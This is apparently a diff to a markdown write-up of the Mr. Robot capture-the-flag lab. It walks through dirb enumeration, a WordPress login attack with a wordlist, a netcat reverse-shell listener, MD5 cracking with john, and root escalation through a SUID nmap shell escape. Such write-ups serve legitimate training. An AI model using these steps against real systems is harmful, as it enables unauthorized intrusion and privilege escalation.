@@ -20,8 +20,8 @@ Used command ```sudo dirb http://192.168.1.8``` to find the hidden files and dir
 ## Web Enumeration
 After the dirb scan I found a file named ```http://192.168.1.8/robots.txt``` and then I manually inspected the file.
 ### Key findings 
-```fsocity.dic``` A massive wordlist.
-```key-1-of-3.txt``` The first flag. 
+```fsocity.dic``` 
+```key-1-of-3.txt``` 
 
 ### Wordpress login page discovery
 dirb scan also flagged a wp login page ```http://192.168.1.8/wp-login```. That got me into a target login page and also wordlist fsocity.dic to use against it. 
@@ -49,7 +49,7 @@ After successfully logged into the website then I navigated to Appearance > Edit
  ```nc -lvp 443 ``` Successfully captured reversed shell as deamon@linux user.
 
 ## Post Exploitation 
-After gaining access as deamon@linux user I nevigated to home directory and found a folder named robot. 
+After gaining access as deamon@linux user I nevigated to home directory and found a folder named robot. But still can't access the second key.
 
 ### Key findings
 ```key-2-of-3.txt```
@@ -58,4 +58,23 @@ After gaining access as deamon@linux user I nevigated to home directory and foun
 ## Cracking the password.raw-md5 
 After getting the hash for the password.raw-md5 by ```cat /home/robot/password.raw-md5``` then used john the ripper to crack the password by using command ```john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
 
- 
+## TTY shell stabilization
+Used ```python -c 'import pty; pty.spawn("/bin/bash")'``` to spawn a pseudo-terminal (PTY). This allowed me to improve the terminal and interact with system's password prompt.
+This time I can access as robot by entering the password cracked from the md5 hash and finally can access ```key-2-of-3.txt```
+
+## privilege escalation to find SUID Binaries
+For escalating previledge to the root user I began by searching the file system for binaries with the SUID (Set User ID) bit enabled.
+Used command ```find / -perm /4000 -type f 2>/tmp/2``` to locate all files where the SUID bit is set (-perm /4000)
+### Key findings 
+```/usr/local/bin/nmap```
+
+## Exploiting Nmap SUID
+After identifying the ```/usr/local/bin/nmap``` I lunched nmap interactive mode by using command ```nmap --interactive```
+
+## Final Key 
+Inside the nmap promt I used shell escape command ```nmap> !sh``` and ran ```whoami``` to confirm that privilege have been escalated to root user.
+With full system control I navigated to the root directory 
+    ```cd /root
+       ls
+       cat key-3-of-3.txt```
+and found the final key.
